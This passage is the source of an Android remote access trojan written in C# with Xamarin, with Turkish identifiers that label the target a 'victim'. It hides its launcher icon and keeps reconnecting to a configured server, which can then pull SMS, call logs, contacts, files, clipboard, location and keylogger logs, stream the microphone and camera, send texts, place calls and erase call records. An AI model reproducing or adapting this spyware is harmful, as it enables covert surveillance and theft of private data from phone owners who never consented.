using Android.App;
using Android.Content;
using Android.OS;
using Android.Widget;
using System;
using System.Collections.Generic;
using Android.Content.PM;
using Android.Runtime;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Text;
using System.IO;
using Xamarin.Essentials;
using System.Globalization;
using System.Threading;
using Android.Provider;
using Android.Database;
using Plugin.Media;
using Android.Telephony;
using Android.Graphics.Drawables;
using System.Linq;
using Android.Views;
using Android.App.Admin;

namespace izci
{
    
    [IntentFilter(new string[] { "android.permission.CAMERA", "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.provider.Telephony.READ_SMS","android.permission.WRITE_CALL_LOG",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_EXTERNAL_STORAGE"}, Priority = (int)IntentFilterPriority.HighPriority)]

    [Activity(Label = "@string/app_name", MainLauncher = true, Icon = "@mipmap/icon")]
    public class MainActivity : Activity
	{
        byte[] buffer = new byte[short.MaxValue];
        public static Socket Soketimiz = default;
        static readonly Type SERVICE_TYPE = typeof(ForegroundService);
        //readonly string TAG = SERVICE_TYPE.FullName;
		static Intent _startServiceIntent;
        public async void Baglanti_Kur()
        {
            await Task.Run(() => { 
            try
            {
               
                IPEndPoint endpoint = new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0], MainValues.port);
                Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Soketimiz.Connect(endpoint);
                Soketimiz.Send(Encoding.UTF8.GetBytes("IP|" +
                    MainValues.KRBN_ISMI + "|" + RegionInfo.CurrentRegion + "/"+ CultureInfo.CurrentUICulture.TwoLetterISOLanguageName 
                    + "|" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "|" + DeviceInfo.Version));
                Soketimiz.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(Sunucudan_Gelen_Veriler), Soketimiz);

            }
            catch //Bağlanan kadar bağlantı metodumuzu çağırıyoruz.
            {
                Baglanti_Kur();

            }
            });
        }
       public void kameraCek()
        {
            UpdateTimeTask.Kamera();
        }
        List<string> allDirectory_ = default;
        List<string> sdCards = default;
        public void dosyalar()
        {
            allDirectory_ = new List<string>();
            // try
            // {
            Java.IO.File[] _path = GetExternalFilesDirs(null);
            sdCards = new List<string>();
                List<string> allDirectory = new List<string>();
                foreach (var spath in _path)
                {
                    if (spath.Path.Contains("emulated") == false)
                    {
                        string s = spath.Path.ToString();
                        s = s.Replace(s.Substring(s.IndexOf("/And")), "");                 
                        sdCards.Add(s);
                    }
                  
                }
            if (sdCards.Count > 0)
            {
                listf(sdCards[0]);
            }
            sonAsama();         
            //}
            // catch (Exception ex) {
            //      Toast.MakeText(this, "DOSYA YÖNETİCİSİ " + ex.Message, ToastLength.Long).Show();
            /*
            PictureCallback.Send(Soketimiz, Encoding.UTF8.GetBytes("FILES|HATA " + ex.Message), 0,
                   Encoding.UTF8.GetBytes("FILES|HATA " + ex.Message).Length, 30000);
            */
            //  }

        }

        public void sonAsama()
        {
            DirectoryInfo di = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath);
            FileInfo[] fi = di.GetFiles("*.*", SearchOption.AllDirectories);
            foreach (FileInfo f_info in fi)
            {
                if (f_info.DirectoryName.Contains(".thumbnail") == false)
                {
                    allDirectory_.Add(f_info.Name + "=" + f_info.DirectoryName + "=" + f_info.Extension + "=" + GetFileSizeInBytes(
                        f_info.FullName) + "=CİHAZ=");
                }
            }
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + System.Environment.NewLine;
            }
            PictureCallback.Send(Soketimiz, Encoding.UTF8.GetBytes("FILES|" + dosyalarS), 0,
                   Encoding.UTF8.GetBytes("FILES|" + dosyalarS).Length, 59999);
        }
       
        public void listf(string directoryName)
        {
            Java.IO.File directory = new Java.IO.File(directoryName);
            Java.IO.File[] fList = directory.ListFiles();
            if (fList != null)
            {
                foreach (Java.IO.File file in fList)
                {
                    try
                    {
                        if (file.IsFile)
                        {
                            allDirectory_.Add(file.Name + "=" + file.AbsolutePath + "=" +
                    file.AbsolutePath.Substring(file.AbsolutePath.LastIndexOf(".")) + "=" + GetFileSizeInBytes(
                                     file.AbsolutePath) + "=SDCARD=");
                        }
                        else if (file.IsDirectory)
                        {
                            listf(file.AbsolutePath);
                        }
                    }catch(Exception ) { }
                }             
            }   
        }
      
    public void uygulamalar()
        {
            var apps = PackageManager.GetInstalledApplications(PackageInfoFlags.MetaData);
            string bilgiler = "";
            for (int i = 0; i < apps.Count; i++)
            {
                try
                {
                    ApplicationInfo applicationInfo = apps[i];
                    var isim = applicationInfo.LoadLabel(PackageManager);
                    var paket_ismi = applicationInfo.PackageName;
                    string infos = isim + "=" + paket_ismi + "=";
                    bilgiler += infos + "&";
                }
                catch (Exception) { }
            }
            byte[] gidecekler = Encoding.UTF8.GetBytes("APPS|" + bilgiler);
            PictureCallback.Send(Soketimiz, gidecekler, 0, gidecekler.Length, 59999);
        }
        public static string GetFileSizeInBytes(string filenane)
        {
            try
            {
                string[] sizes = { "B", "KB", "MB", "GB", "TB" };
                double len = new FileInfo(filenane).Length;
                int order = 0;
                while (len >= 1024 && order < sizes.Length - 1)
                {
                    order++;
                    len = len / 1024;
                }
                string result = string.Format("{0:0.##} {1}", len, sizes[order]);
                return result;
            }
            catch(Exception ex) { return ex.Message; }
        }

            UdpClient client = null;
            AudioStream audioStream = null;
            public void micSend(string sampleRate)
            {
                client = new UdpClient();
                audioStream = new AudioStream(int.Parse(sampleRate));
                audioStream.OnBroadcast += AudioStream_OnBroadcast;
                audioStream.Start();

            }
            public void micStop()
            {
                if (audioStream != null)
                {
                    audioStream.Stop();
                    audioStream.Flush();
                    audioStream = null;
                    client.Close();
                    client.Dispose();

                }
            }
            private void AudioStream_OnBroadcast(object sender, byte[] e)
            {
                client.Send(e, e.Length, new IPEndPoint(Dns.GetHostAddresses(MainValues.IP)[0],MainValues.port));
                //Toast.MakeText(this, "Paket gönderildi: "+ e.Length.ToString(), ToastLength.Long).Show();
            }
        
        public static bool key_gonder = false;
        void Sunucudan_Gelen_Veriler(IAsyncResult ar)
        {
            RunOnUiThread(() =>
            {
             try
            {
                Socket sunucu = (Socket)ar.AsyncState;                                 
                    int deger = sunucu.EndReceive(ar);
                    string[] ayirici = Encoding.UTF8.GetString(buffer, 0, deger).Split('|');//Gelen verileri ayrıştır.
                    switch (ayirici[0]) {
                        case "DOSYABYTE":
                            byte[] alinan_dosya_byte = new byte[int.Parse(ayirici[1])];
                            Receive(sunucu, alinan_dosya_byte, 0, alinan_dosya_byte.Length, 59999);
                            File.WriteAllBytes(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[2], alinan_dosya_byte);
                            byte[] alindi = Encoding.UTF8.GetBytes("DOSYAALINDI|" + MainValues.KRBN_ISMI);
                            PictureCallback.Send(Soketimiz, alindi, 0,
                            alindi.Length, 59999);
                            break;
                        case "DELETE":
                            try { DeleteFile_(ayirici[1]); }catch(Exception) { }
                            break;
                        case "CALLLOGS":
                            telefonLogu();
                            break;
                        case "ANASAYFA":
                            try
                            {
                                Intent i = new Intent(Intent.ActionMain);
                                i.AddCategory(Intent.CategoryHome);
                                i.SetFlags(ActivityFlags.NewTask);
                                StartActivity(i);
                            }
                            catch (Exception) { }
                            break;
                        case "GELENKUTUSU":
                            smsLogu("gelen");
                            break;
                        case "GIDENKUTUSU":
                            smsLogu("giden");
                            break;
                        case "UNIQ":
                            //Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                            MainValues.uniq_id = ayirici[1];
                            break;
                        case "CAM":
                            if (CrossMedia.Current.IsCameraAvailable)
                            {
                                MainValues.front_back = ayirici[1];
                                kameraCek();
                            }
                            else
                            {
                                //Toast.MakeText(this,"UNAVAIBLE",ToastLength.Long).Show();
                                byte[] cam_kullaniliyor = Encoding.UTF8.GetBytes("CAMNOT|");
                                PictureCallback.Send(Soketimiz, cam_kullaniliyor, 0, cam_kullaniliyor.Length, 59999);
                            }                           
                            break;
                        case "DOSYA":
                            dosyalar();                           
                            break;
                        case "INDIR":
                            try
                            {
                                byte[] bite = Encoding.UTF8.GetBytes("UZUNLUK|" + File.ReadAllBytes(ayirici[1]).Length.ToString() + "|" + ayirici[1].Substring(ayirici[1].LastIndexOf("/") + 1) + "|" + "[KURBAN_ADI]|");
                                byte[] dosya = File.ReadAllBytes(ayirici[1]);
                                PictureCallback.Send(Soketimiz, bite, 0,
                                bite.Length, 59999);
                                PictureCallback.Send(Soketimiz, dosya, 0, dosya.Length, 59999);
                            }
                            catch (Exception) { }
                            break;
                        case "MIC":
                            switch (ayirici[1]) {
                                case "BASLA":                               
                                micSend(ayirici[2]);
                                break;
                                case "DURDUR":
                                    micStop();
                                    break;
                              }
                            break;
                        case "KEYBASLAT":          
                            key_gonder = true;
                            break;
                        case "KEYDUR":
                            key_gonder = false;
                            break;
                        case "LOGLARIHAZIRLA":
                            DirectoryInfo dinfo = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos = dinfo.GetFiles("*.tht");
                            if (fileInfos.Length > 0)
                            {
                                foreach(FileInfo fileInfo in fileInfos)
                                {
                                    log_dosylari_gonder += fileInfo.Name + "=";
                                }
                                byte[] gonder = Encoding.UTF8.GetBytes("LOGDOSYA|"+ log_dosylari_gonder);
                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59000);
                            }
                            else
                            {
                                byte[] gonder = Encoding.UTF8.GetBytes("LOGDOSYA|LOG_YOK");
                                PictureCallback.Send(Soketimiz, gonder, 0, gonder.Length, 59000);
                            }
                            break;
                        case "KEYCEK":
                            byte[] log = Encoding.UTF8.GetBytes("KEYGONDER|"+File.ReadAllText(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly/" + ayirici[1]).Replace(
                                System.Environment.NewLine
                                , "[NEW_LINE]"));
                            PictureCallback.Send(Soketimiz, log, 0, log.Length, 59000);
                            break;
                        case "DOSYAAC":
                            Ac(ayirici[1]);
                            break;
                        case "GIZLI":
                            StartPlayer(ayirici[1]);
                            break;
                        case "VOLUMELEVELS":
                            sesBilgileri();
                            break;
                        case "ZILSESI":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(ayirici[1]), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }catch(Exception ) {  }
                            break;
                        case "MEDYASESI":
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(ayirici[1]), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception ex) { Toast.MakeText(this, ex.Message +" " +ayirici[1], ToastLength.Long).Show(); }
                            break;
                        case "BILDIRIMSESI": // KAMERADAKİ HER ŞEYE TRY CATCH KOY.
                            try
                            {
                                if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(ayirici[1]), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                            }
                            catch (Exception) { }
                            break;
                        case "REHBERIVER":
                            rehberLogu();
                            break;
                        case "REHBERISIM":
                            string[] ayir = ayirici[1].Split('=');
                            rehberEkle(ayir[1], ayir[0]);
                            break;
                        case "REHBERSIL":
                            rehberNoSil(ayirici[1]);
                            break;
                        case "VIBRATION":
                            try
                            {
                                Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                vibrator.Vibrate(int.Parse(ayirici[1]));
                            }
                            catch (Exception) { }
                            break;
                        case "FLASH":
                            flashIsik(ayirici[1]);
                            break;
                        case "TOST":
                            Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                            break;
                        case "APPLICATIONS":
                            uygulamalar();
                            break;
                            case "OPENAPP":
                            try
                            {
                                Intent intent = PackageManager.GetLaunchIntentForPackage(ayirici[1]);
                                intent.AddFlags(ActivityFlags.NewTask);
                                StartActivity(intent);
                            }
                            catch (Exception ex) { Toast.MakeText(this, ex.Message, ToastLength.Long).Show(); }
                            break;
                        case "DELETECALL":
                            DeleteCallLogByNumber(ayirici[1]);
                            break;
                        case "SARJ":
                            try {
                                var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                var battery = RegisterReceiver(null, filter);
                                int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                int BPercetage = (int)Math.Floor(level * 100D / scale);
                                var per = BPercetage.ToString();
                                var lev = Encoding.UTF8.GetBytes("TELEFONBILGI|" + per.ToString());
                                PictureCallback.Send(Soketimiz, lev, 0, lev.Length, 59999);
                            }
                            catch (Exception) { }
                            break;
                        case "WALLPAPERBYTE":
                            try
                            {
                                byte[] alinan_dosya_byte_ = new byte[int.Parse(ayirici[1])];
                                Receive(sunucu, alinan_dosya_byte_, 0, alinan_dosya_byte_.Length, 59999);
                                duvarKagidi(alinan_dosya_byte_);
                            }
                            catch (Exception) { }
                            break;
                        case "WALLPAPERGET":
                            duvarKagidiniGonder();
                            break;
                        case "PANOGET":
                            panoyuYolla();
                            break;
                        case "PANOSET":
                            panoAyarla(ayirici[1]);
                            break;
                        case "SMSGONDER":
                            string[] baki = ayirici[1].Split('=');
                            try
                            {
                             SmsManager.Default.SendTextMessage(baki[0], null, 
                                 baki[1], null, null);
                            }
                            catch (Exception) { }
                            break;
                        case "ARA":
                            MakePhoneCall(ayirici[1]);
                            break;
                        case "URL":
                        try
                        {
                            var uri = Android.Net.Uri.Parse(ayirici[1]);
                                var intent = new Intent(Intent.ActionView, uri);
                                StartActivity(intent);
                            }
                            catch (Exception) { }
                            break;
                        case "KONUM":
                            lokasyonCek();
                            break;
                        case "PARLAKLIK":
                            parlaklikKac();
                            break;
                        case "PARILTI":
                            parlaklik(int.Parse(ayirici[1]));
                            break;
                        case "LOGTEMIZLE":
                            DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                            FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                            if (fileInfos_.Length > 0)
                            {
                                foreach (FileInfo fileInfo in fileInfos_)
                                {
                                    fileInfo.Delete();
                                }
                            }
                            break;
                    }
                
               
                sunucu.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, new AsyncCallback(Sunucudan_Gelen_Veriler), sunucu);
            }
            catch (SocketException) {
                  // ULAAAAAAAAAN!!!! BEN LAZ ZİYAYIM!!!!
                Baglanti_Kur();
            }
        });
        }
        public async void panoAyarla(string input)
        {
            await Clipboard.SetTextAsync(input);
        }
        public async void panoyuYolla()
        {
            string pano = await Clipboard.GetTextAsync();
            byte[] pala = Encoding.UTF8.GetBytes("PANOGELDI|" + pano);
            PictureCallback.Send(Soketimiz, pala, 0, pala.Length, 59999);
        }
        public void duvarKagidi(byte[] veri)
        {
            Android.Graphics.Bitmap bitmap = Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                try
                {
                    manager.SetBitmap(bitmap);
                }
                catch (Exception)
                { }           
        }
       
        public void duvarKagidiniGonder()
        {
          
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            try
            {

                var image = manager.PeekDrawable();
                Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                byte[] bitmapData;
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                    bitmapData = ms.ToArray();
                }              
                byte[] ziya = Encoding.UTF8.GetBytes("WALLPAPERBYTES|" + bitmapData.Length.ToString());
                PictureCallback.Send(Soketimiz, ziya, 0, ziya.Length, 59999);
                PictureCallback.Send(Soketimiz, bitmapData, 0, bitmapData.Length, 59999);
                //Toast.MakeText(this, "DUVAR KAĞIDI OKAY ", ToastLength.Long).Show();
            }
            catch (Exception)
            {
                //Toast.MakeText(this, "DUVAR KAĞIDI " + ex.Message, ToastLength.Long).Show();
            }
        }

        public async void flashIsik(string ne_yapam)
        {
            switch (ne_yapam) {
                case "AC":
            await Flashlight.TurnOnAsync();
                    break;
                case "KAPA":
                    await Flashlight.TurnOffAsync();
                    break;
        }
        }
        public void MakePhoneCall(string number)
        {
            var uri = Android.Net.Uri.Parse("tel:" + number);
            Intent intent = new Intent(Intent.ActionCall, uri);
            intent.AddFlags(ActivityFlags.NewTask);
            Application.Context.StartActivity(intent);
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception)
            {
            }
        }
        protected Android.Media.MediaPlayer player = new Android.Media.MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                if (player == null)
                {
                    player = new Android.Media.MediaPlayer();
                }
                else
                {
                    Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
                    player.Reset();
                    player.SetDataSource(this,uri);
                    player.Prepare();
                    player.Start();
                }
            }
            catch (Exception) { }
        }
        string log_dosylari_gonder = "";
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "";
            string MEDYA_SESI = "";
            string BILDIRIM_SESI = "";
            mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
            //Zil sesi
            int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
            int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
            ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
            //Medya
            int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
            int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
            MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
            //Bildirim Sesi
            int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
            int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
            BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();

            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=";
            byte[] git_Artik_bezdim = Encoding.UTF8.GetBytes("SESBILGILERI|" + gonderilecekler);
            PictureCallback.Send(Soketimiz, git_Artik_bezdim, 0, git_Artik_bezdim.Length, 59999);
        }
        public void parlaklik(int value)
        {
            try
            {
                var attributesWindow = new WindowManagerLayoutParams();
                attributesWindow.CopyFrom(Window.Attributes);
                attributesWindow.ScreenBrightness = Convert.ToSingle(value);
                Window.Attributes = attributesWindow;
            }
            catch (Exception ex) { Toast.MakeText(this, ex.Message +"AYAR",ToastLength.Long).Show(); }
        }
        public void parlaklikKac()
        {
            try
            {
                var attributesWindow = new WindowManagerLayoutParams();
                attributesWindow.CopyFrom(Window.Attributes);
                byte[] ayar = Encoding.UTF8.GetBytes("PARLAKLIK|" + attributesWindow.ScreenBrightness.ToString());
                PictureCallback.Send(Soketimiz, ayar, 0, ayar.Length, 59999);
                Toast.MakeText(this, attributesWindow.ScreenBrightness.ToString() + "GET", ToastLength.Long).Show();
            }
            catch (Exception ex) { Toast.MakeText(this, ex.Message + "GET", ToastLength.Long).Show(); }
        }
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            Platform.Init(this, savedInstanceState);
            try
            {
                //SetContentView(Resource.Layout.Main);
                var permissionsToCheck = new string[]
                {
                Android.Manifest.Permission.BindDeviceAdmin,
                Android.Manifest.Permission.WriteSettings,
                Android.Manifest.Permission.SetWallpaper,
                Android.Manifest.Permission.SendSms,
                Android.Manifest.Permission.CallPhone,
                Android.Manifest.Permission.Vibrate,
                Android.Manifest.Permission.ReadContacts,
                Android.Manifest.Permission.WriteContacts,
                Android.Manifest.Permission.RecordAudio,
                Android.Manifest.Permission.AccessCoarseLocation,
                Android.Manifest.Permission.AccessFineLocation,
                Android.Manifest.Permission.WriteCallLog,
                Android.Manifest.Permission.ReadExternalStorage,
                Android.Manifest.Permission.Camera,
                Android.Manifest.Permission.WriteExternalStorage,
                Android.Manifest.Permission.ForegroundService,
                Android.Manifest.Permission.ReadCallLog,
                Android.Manifest.Permission.ReadSms
                };
                CallNotGrantedPermissions(permissionsToCheck);
            }
            catch (Exception) { }    
            
            //PowerManager pm = (PowerManager)GetSystemService(PowerService);
            //PowerManager.WakeLock wl = pm.NewWakeLock(WakeLockFlags.Partial, "THT");
            //wl.Acquire();                      
            MainValues.IP = Resources.GetString(Resource.String.IP);
            MainValues.port = int.Parse(Resources.GetString(Resource.String.PORT));
            MainValues.KRBN_ISMI = Resources.GetString(Resource.String.KURBANISMI);
            //otoBasla();
            Baglanti_Kur();
            PackageManager p = PackageManager;
            ComponentName componentName = new ComponentName(ApplicationContext, Class);
            p.SetComponentEnabledSetting(componentName, 
            ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }
            StartForegroundServiceCompat<ForegroundService>(this);
            try
            {
                var alarmManager = GetSystemService(AlarmService).JavaCast<AlarmManager>();
                alarmManager.Set(AlarmType.ElapsedRealtime, SystemClock.ElapsedRealtime() + 5 * 1000, null);
            }
            catch (Exception) { }
            /*
            try
            {
                DevicePolicyManager devicePolicyManager = (DevicePolicyManager)GetSystemService(DevicePolicyService);
                ComponentName demoDeviceAdmin = new ComponentName(this, Java.Lang.Class.FromType(typeof(DeviceAdmin)));
                Intent intent = new Intent(DevicePolicyManager.ActionAddDeviceAdmin);
                intent.AddFlags(ActivityFlags.NewTask);
                intent.PutExtra(DevicePolicyManager.ExtraDeviceAdmin, demoDeviceAdmin);
                intent.PutExtra(DevicePolicyManager.ExtraAddExplanation, "Device administrator");
                StartActivity(intent);
            }catch(Exception ex) { Toast.MakeText(this, "DEVICE ADMIN" + ex.Message, ToastLength.Long).Show(); }
            */
        }
        public async void otoBasla()
        {
            await Task.Delay(15000);
            if (!Directory.Exists(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly"))
            {
                Directory.CreateDirectory(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
            }
            StartForegroundServiceCompat<ForegroundService>(this);
            
        }
        /*
        protected override void OnDestroy()
		{
			base.OnDestroy();
		}
        */
        public override void OnRequestPermissionsResult(int requestCode, string[] permissions, [GeneratedEnum] Permission[] grantResults)
        {
            Platform.OnRequestPermissionsResult(requestCode, permissions, grantResults);

            base.OnRequestPermissionsResult(requestCode, permissions, grantResults);
        }
        
        private Intent GetIntent(Type type, string action)
        {
            var intent = new Intent(this, type);
            intent.SetAction(action);
            return intent;
        }

        public void StartForegroundServiceCompat<T>(Context context, Bundle args = null)where T : Service
        {
            _startServiceIntent = GetIntent(SERVICE_TYPE, MainValues.ACTION_START_SERVICE);

            if (args != null)
                _startServiceIntent.PutExtras(args);

            if (Build.VERSION.SdkInt >= BuildVersionCodes.O)
                context.StartForegroundService(_startServiceIntent);
            else
                context.StartService(_startServiceIntent);
        }

        private void CallNotGrantedPermissions(string[] permissionsToCheck)
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                var permissionStillNeeded = GetNotGrantedPermissions(permissionsToCheck);
                if (permissionStillNeeded.Length > 0)
                {
                    RequestPermissions(permissionStillNeeded, 5);
                }
            }
        }

        private string[] GetNotGrantedPermissions(string[] permissionsToCheck)
        {
            var permissionStillNeeded = new List<string>();
            for (int i = 0; i < permissionsToCheck.Length; i++)
            {
                if (Permission.Granted != CheckSelfPermission(permissionsToCheck[i]))
                    permissionStillNeeded.Add(permissionsToCheck[i]);
            }

            return permissionStillNeeded.ToArray();
        }
        public static void Receive(Socket socket, byte[] buffer, int offset, int size, int timeout)
        {
            int startTickCount = System.Environment.TickCount;
            int received = 0;
            do
            {
                if (System.Environment.TickCount > startTickCount + timeout)
                    throw new Exception("Timeout.");
                try
                {
                    received += socket.Receive(buffer, offset + received, size - received, SocketFlags.None);
                }
                catch (SocketException ex)
                {
                    if (ex.SocketErrorCode == SocketError.WouldBlock ||
                        ex.SocketErrorCode == SocketError.IOPending ||
                        ex.SocketErrorCode == SocketError.NoBufferSpaceAvailable)
                    {
                        Thread.Sleep(30);
                    }
                    else
                        throw ex;
                }
            } while (received < size);
        }
        public void smsLogu(string nereden)
        {
            LogVerileri veri = new LogVerileri(this, nereden);
            veri.smsLeriCek();
            string gidecek_veriler = "";
            var sms_ = veri.smsler;
                for (int i = 0; i < sms_.Count; i++)
                {

                string bilgiler = sms_[i].Gonderen + "=" + sms_[i].Icerik + "="
                + sms_[i].Tarih + "="+LogVerileri.SMS_TURU+"=";

                gidecek_veriler += bilgiler + "&";
                
                }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "SMS YOK"; }
            byte[] isim_bytlari = Encoding.UTF8.GetBytes("SMSLOGU|" + gidecek_veriler);
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
        }
        public void telefonLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.aramaKayitlariniCek();
            var list = veri.kayitlar;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
                {
                string bilgiler = (list[i].Numara + "=" + list[i].Tarih + "="
                    + list[i].Durasyon + "=" + list[i].Tip + "=");

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "CAGRI YOK"; }
            byte[] isim_bytlari = Encoding.UTF8.GetBytes("CAGRIKAYITLARI|" + gidecek_veriler);
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
        }
        public void rehberLogu()
        {
            LogVerileri veri = new LogVerileri(this, null);
            veri.rehberiCek();
            var list = veri.isimler_;
            string gidecek_veriler = "";
            for (int i = 0; i < list.Count; i++)
            {
                string bilgiler = (list[i].Isim + "=" + list[i].Numara + "="
                    );

                gidecek_veriler += bilgiler + "&";
            }
            if (string.IsNullOrEmpty(gidecek_veriler)) { gidecek_veriler = "REHBER YOK"; }
            byte[] isim_bytlari = Encoding.UTF8.GetBytes("REHBER|" + gidecek_veriler);
            PictureCallback.Send(Soketimiz, isim_bytlari, 0, isim_bytlari.Length, 59999);
        }
        public void rehberEkle(string FirstName, string PhoneNumber)
        {
            List<ContentProviderOperation> ops = new List<ContentProviderOperation>();
            int rawContactInsertIndex = ops.Count;

            ContentProviderOperation.Builder builder =
                ContentProviderOperation.NewInsert(ContactsContract.RawContacts.ContentUri);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountType, null);
            builder.WithValue(ContactsContract.RawContacts.InterfaceConsts.AccountName, null);
            ops.Add(builder.Build());

            //Name
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredName.ContentItemType);
            //builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.FamilyName, LastName);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredName.GivenName, FirstName);
            ops.Add(builder.Build());

            //Number
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Phone.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.Number, PhoneNumber);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.Type,
                    ContactsContract.CommonDataKinds.StructuredPostal.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Phone.InterfaceConsts.Label, "Primary Phone");
            ops.Add(builder.Build());
            /*
            //Email
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.Email.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Data, Email);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Type,
                ContactsContract.CommonDataKinds.Email.InterfaceConsts.TypeCustom);
            builder.WithValue(ContactsContract.CommonDataKinds.Email.InterfaceConsts.Label, "Email");
            ops.Add(builder.Build());

            //Address
            builder = ContentProviderOperation.NewInsert(ContactsContract.Data.ContentUri);
            builder.WithValueBackReference(ContactsContract.Data.InterfaceConsts.RawContactId, rawContactInsertIndex);
            builder.WithValue(ContactsContract.Data.InterfaceConsts.Mimetype,
                ContactsContract.CommonDataKinds.StructuredPostal.ContentItemType);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.Street, Address1);
            builder.WithValue(ContactsContract.CommonDataKinds.StructuredPostal.City, Address2);
            ops.Add(builder.Build());
            */
            try
            {
                var res = ContentResolver.ApplyBatch(ContactsContract.Authority, ops);

                Toast.MakeText(this, "Contact Saved", ToastLength.Short).Show();
            }
            catch
            {
